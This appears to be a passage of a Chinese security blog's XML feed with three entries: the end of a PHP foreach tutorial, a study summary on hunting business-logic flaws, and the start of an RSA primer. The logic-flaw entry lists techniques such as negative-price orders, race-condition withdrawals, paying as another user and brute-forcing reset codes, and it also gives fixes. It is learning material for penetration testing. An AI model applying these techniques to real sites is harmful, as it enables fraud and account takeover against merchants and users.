class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"><span class="number">1</span> =&gt; <span class="number">2</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"><span class="number">2</span> =&gt; <span class="number">3</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="number">3</span> =&gt; <span class="number">3</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>解决方法：在每次foreach后unset解除&amp;的指定关系，或者在每次遍历中使用不同的变量名：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($value);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">//使用不同的变量名</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $val) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$val "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑漏洞挖掘学习总结</title>
    <url>/2018/09/17/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="逻辑漏洞挖掘学习（总结完善）"><a href="#逻辑漏洞挖掘学习（总结完善）" class="headerlink" title="逻辑漏洞挖掘学习（总结完善）"></a>逻辑漏洞挖掘学习（总结完善）</h2><blockquote>
<p>近学习了一下挖逻辑漏洞，针对逻辑漏洞学习到的点做一下总结，主要以看思路和漏洞实例在 学习，参考链接就是总结中的链接以及与这些链接相关的网站，太多了，就直接在文章总列举出 来了。逻辑漏洞的挖掘主要还是在数据包的各个参数上，一定要细心。</p>
</blockquote>
<h3 id="工具：BurpSuit-主要的逻辑漏洞的挖掘工具"><a href="#工具：BurpSuit-主要的逻辑漏洞的挖掘工具" class="headerlink" title="工具：BurpSuit(主要的逻辑漏洞的挖掘工具)"></a>工具：BurpSuit(主要的逻辑漏洞的挖掘工具)</h3><h3 id="思路：复杂灵活"><a href="#思路：复杂灵活" class="headerlink" title="思路：复杂灵活"></a>思路：复杂灵活</h3><h3 id="核心：绕过真实身份认证或者正常业务流程达到预期目的"><a href="#核心：绕过真实身份认证或者正常业务流程达到预期目的" class="headerlink" title="核心：绕过真实身份认证或者正常业务流程达到预期目的"></a>核心：绕过真实身份认证或者正常业务流程达到预期目的</h3><h3 id="用户身份：认证（用户身份特性认证）"><a href="#用户身份：认证（用户身份特性认证）" class="headerlink" title="用户身份：认证（用户身份特性认证）"></a>用户身份：认证（用户身份特性认证）</h3><ul>
<li>本地认证</li>
<li>服务端认证</li>
</ul>
<h3 id="业务流程：对业务流程的熟悉程度（各类型网站-业务模式）"><a href="#业务流程：对业务流程的熟悉程度（各类型网站-业务模式）" class="headerlink" title="业务流程：对业务流程的熟悉程度（各类型网站+业务模式）"></a>业务流程：对业务流程的熟悉程度（各类型网站+业务模式）</h3><ul>
<li>制定漏洞模型</li>
<li>重点业务功能区：个人信息区域、密码修改区域、密码忘记区域、支付区域、手机号区域等</li>
</ul>
<h3 id="逻辑漏洞的类型："><a href="#逻辑漏洞的类型：" class="headerlink" title="逻辑漏洞的类型："></a>逻辑漏洞的类型：</h3><h4 id="支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）"><a href="#支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）" class="headerlink" title="支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）"></a>支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）</h4><h5 id="订单："><a href="#订单：" class="headerlink" title="订单："></a>订单：</h5><ul>
<li>选择商品时修改商品的价格（也可以在确认订单的时候修改订单，可以改小或者改为负数）</li>
<li>选择商品时更改商品的数量（如设置为负数）<ul>
<li>比如在一个服务器购买网站，他们的硬盘是按G来算的，就好像1G只要1元(假设)，2G只要2元，以此类推，比如那个服务器总共需要200元，我们是否可以修改G的数量来减少支付价格呢，比如我们把G改成-19</li>
</ul>
</li>
<li>商品剩余为一件时，多人同时购买是否产出冲突</li>
<li>生成订单时修改订单的金额</li>
<li>商品为0时是否还可以购买</li>
</ul>
<h5 id="结算："><a href="#结算：" class="headerlink" title="结算："></a>结算：</h5><ul>
<li>优惠活动时打折、优惠券的多次使用<ul>
<li>比如在某商城活动的时候领取优惠券，20元的产品规定只能使用5元的，可以修改为15元等</li>
<li><a href="https://www.secpulse.com/archives/40336.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/40336.html</a></li>
</ul>
</li>
<li>截断数据包，结算的时候修改订单数量、金额<ul>
<li>比如A产品100元，改为-90元</li>
<li>在很多时候，我们都忽略了一个问题，那就是在购买一件商品的时候，我们都喜欢修改成0.01或者负数，但是这里是有一个积分的，就是比如我们在购买1元产品的时候可以获得100积分，但是我们如果将金额数小于1元的话积分就肯定是为空的了，因为这里的积分是按100/元来算的，也就是说，如果我们看到购买xx元有送积分的，我们可以来尝试一下把金额数改成积分最低数，就比如1元。</li>
<li>比如我们在某网站，他们用的是自家的钱包(迷你钱包),这个钱包作用也仅是用于这一个站，在提现时，没有任何验证码或者校验机制，只要输入体现金额就可以提现，并且是秒到账，如果什么负数，修改金额都测试过了都不行，那么你就可以试试多线程并发问题,提现时抓包，比如我现在钱包内有0.1元，那么按理说每提0.01可以提现10次，也就是发送10次进程，但是利用这个问题可以达到多发现几次成功的进程，提现时抓包，然后把数据包发送到BurpSuite工具的Intruder当中，进行批量发送18次，然后可以看到成功的提现到了12次（并发、数据库操作加锁）</li>
<li>比如a产品为999元，当我们购买的时候我们可以试试修改数量成-1个，看是否有变成-999元，我们点击支付一下，一般来说，都可能支付失败的，因为这个时候服务器验证了这个价格是否和服务器中对应的价格是否一样，此时我们可以将-999元的产品放到购物车，再去此网站购买一个1000元产品的购物车，然后我们可以来点击购买，可以看到支付价格就变成了1元(1000+(-999)=1)了</li>
</ul>
</li>
<li>截断数据包，结算的时候修改支付方式（第三方的支付接口逻辑设计不严格就会产生）<ul>
<li>比如将百度钱包的接口、微信支付等改为一个其他的接口，如果逻辑设计不严格就会产生漏洞</li>
</ul>
</li>
<li>伪造订单，刷单<ul>
<li>例如：在购买一个产品的时候，目标程序时用过A参数判断是否支付，比如A=1实时表示支付，A=0时表示未支付，通过修改可控的A来验证是否可以伪造订单、等。</li>
</ul>
</li>
<li>重复支付（请求重放、多次下单）<ul>
<li>比如一些商场中有一些试用卡之类的，通过某种渠道获得的(比如签到，分享网站信息，购买某个商品送来的)，当我们试用的时候主动取消试用，那么这个时候试用卡可能会返回到我们账户中，这里的问题就是如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子。</li>
<li>比如，我在试用某个产品的时候，每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷得问题</li>
</ul>
</li>
<li>越权支付<ul>
<li>比如我们在购买某产品的时候，支付时会出现当前用户的ID，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品</li>
</ul>
</li>
<li>参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值</li>
</ul>
<h5 id="支付漏洞突破口："><a href="#支付漏洞突破口：" class="headerlink" title="支付漏洞突破口："></a>支付漏洞突破口：</h5><ul>
<li>截断数据包，伪造第三方的确认信息</li>
<li>绕过商家确认直接退货</li>
<li>绕过商品类型直接退货（退货是否被允许，比如虚拟商品，话费等）</li>
<li>绕过客户端验证直接确认收货</li>
</ul>
<h5 id="支付漏洞实例："><a href="#支付漏洞实例：" class="headerlink" title="支付漏洞实例："></a>支付漏洞实例：</h5><ul>
<li><a href="https://www.0dayhack.com/post-832.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-832.html</a></li>
<li><a href="https://www.bigniu.com/bug/view/935" target="_blank" rel="noopener">https://www.bigniu.com/bug/view/935</a></li>
<li><a href="https://www.bigniu.com/bug/view/929" target="_blank" rel="noopener">https://www.bigniu.com/bug/view/929</a></li>
<li><a href="https://www.secpulse.com/archives/47665.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/47665.html</a></li>
<li><a href="https://www.secpulse.com/archives/41144.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41144.html</a></li>
<li><a href="https://www.secpulse.com/archives/39768.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/39768.html</a></li>
<li><a href="https://www.secpulse.com/archives/36412.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/36412.html</a></li>
<li><a href="https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式）</a></li>
<li><a href="https://www.secpulse.com/archives/35701.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35701.html</a></li>
<li><a href="https://www.secpulse.com/archives/35188.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35188.html</a></li>
<li><a href="http://www.freebuf.com/vuls/151196.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/151196.html</a></li>
</ul>
<h5 id="支付漏洞修复方案："><a href="#支付漏洞修复方案：" class="headerlink" title="支付漏洞修复方案："></a>支付漏洞修复方案：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">和银行交易时，做数据签名，对用户金额和订单签名。</span><br><span class="line">敏感参数不要明文放在URL中</span><br><span class="line">服务端效验客户端提交的参数</span><br><span class="line">在服务端计算金额的时候，一定要判断是否为正数。</span><br><span class="line">支付过程中加一个服务器生成的key，用户校验参数有没有被串改。</span><br><span class="line">如果一定需要用URL传递相关参数，建议进行后端的签名验证</span><br><span class="line">订单金额和充值接口返回的数据进行校验</span><br><span class="line">提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。</span><br><span class="line">支付时应从服务器拉取数据，而不是直接读客户端的值！！</span><br></pre></td></tr></table></figure>
<h4 id="密码重置漏洞："><a href="#密码重置漏洞：" class="headerlink" title="密码重置漏洞："></a>密码重置漏洞：</h4><h5 id="用户密码找回方式："><a href="#用户密码找回方式：" class="headerlink" title="用户密码找回方式："></a>用户密码找回方式：</h5><ul>
<li>手机短信验证码<ul>
<li><a href="https://www.secpulse.com/archives/36619.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/36619.html</a></li>
<li><a href="https://www.secpulse.com/archives/35564.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35564.html</a></li>
<li><a href="https://www.secpulse.com/archives/35488.html（直接改返回包）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35488.html（直接改返回包）</a></li>
<li><a href="https://www.secpulse.com/archives/35169.html（通过越权修改）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35169.html（通过越权修改）</a></li>
<li><a href="https://www.secpulse.com/archives/35023.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35023.html</a></li>
<li><a href="https://www.secpulse.com/archives/34710.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/34710.html</a></li>
<li><a href="https://www.secpulse.com/archives/33800.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/33800.html</a></li>
</ul>
</li>
<li>邮箱（密码找回链接）</li>
<li>自动生成新密码</li>
</ul>
<h5 id="密码重置突破口："><a href="#密码重置突破口：" class="headerlink" title="密码重置突破口："></a>密码重置突破口：</h5><ul>
<li>认证凭证暴力破解（多数为验证码4位及以下的纯数字，验证码时间长，不失效可爆破）<ul>
<li><a href="https://bysec.io/detailsMasked.pyp?id=5" target="_blank" rel="noopener">https://bysec.io/detailsMasked.pyp?id=5</a></li>
<li><a href="https://www.secpulse.com/archives/41168.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41168.html</a></li>
</ul>
</li>
<li>认证凭证回显（明文传输）<ul>
<li><a href="https://www.secpulse.com/archives/49496.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/49496.html</a></li>
</ul>
</li>
<li>认证凭证重复使用（比如验证码重复使用）</li>
<li>重新绑定（如重新绑定邮箱、手机号且自己可控）<ul>
<li><a href="https://www.test404.com/post-1352.html?wafcloud_antihack=2" target="_blank" rel="noopener">https://www.test404.com/post-1352.html?wafcloud_antihack=2</a></li>
<li><a href="https://xz.aliyun.com/t/2011（密码重置里面、越权）" target="_blank" rel="noopener">https://xz.aliyun.com/t/2011（密码重置里面、越权）</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-23318-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23318-1-1.html</a></li>
</ul>
</li>
<li>用户身份特性认证（token生成可控）</li>
<li>服务器端认证为空、直接删除验证码、或者认证的特征值可控：<ul>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值）</a></li>
</ul>
</li>
<li>本地认证、修改返回值<ul>
<li><a href="https://www.secpulse.com/archives/37864.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/37864.html</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-23319-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23319-1-1.html</a></li>
</ul>
</li>
<li>删除校验码绕过</li>
<li>cookie覆盖<ul>
<li><a href="https://bbs.ichunqiu.com/thread-38176-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-38176-1-1.html</a></li>
</ul>
</li>
</ul>
<h4 id="任意用户登录："><a href="#任意用户登录：" class="headerlink" title="任意用户登录："></a>任意用户登录：</h4><ul>
<li>空密码绕过（绕过前端改为空值）</li>
<li>身份替换（登录成功产生session）</li>
<li>认证凭证绕过</li>
<li>枚举、越权<ul>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过）</a></li>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸）</a></li>
</ul>
</li>
</ul>
<h4 id="认证缺陷漏洞："><a href="#认证缺陷漏洞：" class="headerlink" title="认证缺陷漏洞："></a>认证缺陷漏洞：</h4><ul>
<li>弱验证</li>
<li>空验证</li>
<li>认证凭证有效性、唯一性<ul>
<li><a href="http://www.heavensec.org/index.php/1613.html" target="_blank" rel="noopener">http://www.heavensec.org/index.php/1613.html</a></li>
</ul>
</li>
</ul>
<h5 id="身份验证码之暴力破解-（https-bbs-ichunqiu-com-thread-45640-1-1-html）"><a href="#身份验证码之暴力破解-（https-bbs-ichunqiu-com-thread-45640-1-1-html）" class="headerlink" title="身份验证码之暴力破解  （https://bbs.ichunqiu.com/thread-45640-1-1.html）"></a>身份验证码之暴力破解  （<a href="https://bbs.ichunqiu.com/thread-45640-1-1.html）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45640-1-1.html）</a></h5><ul>
<li>无防护措施（没有对登录、注册、重置密码之类的功能进行一定的防护，所以当碰到没有验证码的，没有对输错密码次数进行限制，而且还是明文传输的系统，先可以考虑爆破）</li>
<li>锁定机制——&gt;撞库（有些系统会有一些防护措施，比如超过一定的错误次数会将账号进行锁定，或者是某IP频繁的进行登录操作会封IP，这是后可以进行撞库，用弱密码遍历用户名；有些限制并没有在后台验证，也可以加入XFF等方式绕过）<ul>
<li>修复：限制单位时间内执行某项操作的次数，要对限制的方法、次数等进行详细的说明，限制的验证也应该再服务端</li>
</ul>
</li>
<li>验证码（可以防止自动化攻击）<ul>
<li>图片验证码——&gt;绕过（图片验证码反复使用、验证码在前端校验、验证码可识别、验证码在客户端传输）</li>
<li>短信验证码——&gt;爆破/绕过（与图片类似）</li>
<li>修复：所有的验证码生存周期都应该是一次性的，无论校验成功与失败，且验证码加入干扰线，变形等防止机器识别，对于可爆破的参数加上人机识别，通过设置的阀值来判断；同时验证过程不应将有助于推测正确验证答案的信息返回到客户端。</li>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909</a></li>
</ul>
</li>
</ul>
<h4 id="越权："><a href="#越权：" class="headerlink" title="越权："></a>越权：</h4><ul>
<li><p>水平越权</p>
<ul>
<li><p>实例：</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.bigniu.com/bug/view/926</span><br><span class="line">https://xz.aliyun.com/t/2011</span><br><span class="line">https://www.secpulse.com/archives/41142.html</span><br><span class="line">https://www.secpulse.com/archives/38473.html</span><br><span class="line">https://www.secpulse.com/archives/35169.html</span><br><span class="line">https://bbs.ichunqiu.com/thread-39287-1-1.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0196245.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0194518.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193632.html(越权删除+敏感信息泄露)</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192676.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192848.html（越权任意用户修改+信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权修改+密码重置）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191930.html（整站越权+通过组合越权获取所有信息）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191192.html（爆破+越权）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0190106.html（绕过signature字段达到越权）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189823.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0188760.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0187544.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>垂直越权</p>
<ul>
<li><p>实例：</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2011</span><br><span class="line">https://www.secpulse.com/archives/41174.html</span><br><span class="line">https://www.secpulse.com/archives/37083.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189507.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>未授权访问（登录凭证验证）</p>
</li>
<li><p>绕过授权模式（参数构造）</p>
</li>
</ul>
<h4 id="敏感信息泄露："><a href="#敏感信息泄露：" class="headerlink" title="敏感信息泄露："></a>敏感信息泄露：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.bigniu.com/bug/view/930</span><br><span class="line">https://www.bigniu.com/bug/view/928</span><br><span class="line">https://www.bigniu.com/bug/view/927</span><br><span class="line">https://www.secpulse.com/archives/47842.html</span><br><span class="line">https://www.secpulse.com/archives/47482.html</span><br><span class="line">https://www.secpulse.com/archives/42603.html</span><br><span class="line">https://www.secpulse.com/archives/41375.html</span><br><span class="line">https://www.secpulse.com/archives/41253.html</span><br><span class="line">https://www.secpulse.com/archives/41144.html</span><br><span class="line">https://www.secpulse.com/archives/40909.html</span><br></pre></td></tr></table></figure>
<h4 id="接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历"><a href="#接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历" class="headerlink" title="接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历"></a>接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历</h4><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><blockquote>
<p>在学习过程中对于遇见的一些新学习到的业务逻辑测试方法的总结</p>
</blockquote>
<h3 id="争对客户端刷新验证码的绕过"><a href="#争对客户端刷新验证码的绕过" class="headerlink" title="争对客户端刷新验证码的绕过"></a>争对客户端刷新验证码的绕过</h3><ol>
<li><p>在一些有验证码的站点，每次进行验证的验证码都是通过第三方的接口调用的，有些验证码是通过<img src>加载的，这个时候直接访问加载的地址显示直接就是验证码，所以，正对这种验证码的刷新就可以通过拦截数据包，刚好卡在验证码链接跳转的那一步，进行重放，通过这种方法来绕过。这里通过漏洞银行直播中的两张图来说明</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539268118.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539265914.99.png" alt></p>
</li>
</ol>
<h3 id="对于滑动验证码的的绕过"><a href="#对于滑动验证码的的绕过" class="headerlink" title="对于滑动验证码的的绕过"></a>对于滑动验证码的的绕过</h3><ol>
<li>现在有好多网站都是滑动验证码，在学习了漏洞银行直播中的业务逻辑挖掘做一个笔记：<ol>
<li>首先在滑动验证码哪里查看JS代码，看一下JS代码，看组件是怎么构造加载的，然后确定滑动验证码需要的一些参数</li>
<li>curl 等方式获取页面，查找一些需要的参数</li>
<li>通过获取的参数构造正常滑动以后的链接作为payload</li>
<li>通过curl 访问payload获取数据<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539266990.35.png" alt></li>
</ol>
</li>
</ol>
<h3 id="net-Nlog日志泄露"><a href="#net-Nlog日志泄露" class="headerlink" title=".net  Nlog日志泄露"></a>.net  Nlog日志泄露</h3><ol>
<li>对于现在许多.net的网站，一般在遇到.net的网站访问一些目录时报404/403等，就会放弃。其实.net的网站有Nlog日志，通过Nlog的特性构造一些payload就可以访问有些站点的Nlog日志，里面可能会包含敏感信息。<ol>
<li>关于Nlog的特性一下文章有说明：<a href="http://www.cnblogs.com/felixnet/p/5498759.html" target="_blank" rel="noopener">http://www.cnblogs.com/felixnet/p/5498759.html</a></li>
<li>关于payload主要就是拼接当前的一些时间等关键值</li>
</ol>
</li>
</ol>
<h3 id="xxe接口越权"><a href="#xxe接口越权" class="headerlink" title="xxe接口越权"></a>xxe接口越权</h3><ol>
<li>xxe的越权，这里还是一些网站使用的接口权限设置不当造成的，路劲可以通过dirb探测等等。</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>渗透测试</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA总结</title>
    <url>/2018/09/02/RSA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="关于RSA的一些总结"><a href="#关于RSA的一些总结" class="headerlink" title="关于RSA的一些总结"></a>关于RSA的一些总结</h2><blockquote>
<p>最近一段时间比赛比较多，密码学的题也是各种各样的，有时候会碰到RSA，想想上学期学的数论，RSA就讲了整整一个月，最后发现代码上还是应用不了，就像没学一样，毕竟在实际生活中好多加密算法都是设计好的。为了让学过的东西不要白学，抽点时间结合题目，对RSA进行一下总结，网上好多关于RSA的文章写的都挺好的，但还是喜欢自己动手做一遍。本文没有啥原创的东西，主要是对学习的一个记录。</p>
</blockquote>
<h3 id="RSA简介："><a href="#RSA简介：" class="headerlink" title="RSA简介："></a>RSA简介：</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535850694.5.png" alt></p>
<ul>
<li><p>上图是对RSA算法非对称加解密的一个描述，也是RSA算法最根本的东西，下面说一下RSA算法被攻击的可能性（有没有在知道公钥的情况下推导出私钥）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535851071.47.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要知道的理论是：</span><br><span class="line">    ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 </span><br><span class="line">    φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 </span><br><span class="line">    n=pq。只有将n因数分解，才能算出p和q。</span><br><span class="line">所以：如果n可以被分解，那就可以推到出d,私钥就可以被破解，但实际上p,q是大素数，分解是很困难的</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些理论支撑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">欧拉函数：φ(n)是小于等于n的数中与n互质的数的数目</span><br><span class="line">欧拉函数是积性函数——若p,q互质，φ(p*q)= φ(p) *φ(q) </span><br><span class="line">若p为质数，则φ(p)=p-1</span><br><span class="line"></span><br><span class="line">同余定理：给定一个正整数m，如果两个整数a和b满足（a-b）能够被m整除，即（a-b）/m得到一个整数，那么就称整数a与b对模m同余，记作a≡b(mod m)。 </span><br><span class="line">性质： </span><br><span class="line">1 自反性 a≡a (mod m) </span><br><span class="line">2 对称性 若a≡b(mod m)，则b≡a (mod m) </span><br><span class="line">3 传递性 若a≡b (mod m)，b≡c (mod m)，则a≡c (mod m) </span><br><span class="line">4 同余式相加 若a≡b (mod m)，c≡d(mod m)，则a+-c≡b+-d (mod m) </span><br><span class="line">5 同余式相乘 若a≡b (mod m)，c≡d(mod m)，则ac≡bd (mod m)</span><br><span class="line"></span><br><span class="line">求逆元：指有一个整数d，可以使得e*d被φ(n)除的余数为1，即e*d ≡ 1 (mod φ(n))，这个式子等于e*d - 1 = k*φ(n)</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些程序代码上的支撑：（都是用python实现算法的应用）</p>
<ul>
<li><p>快速幂取模：等价于pow方法</p>
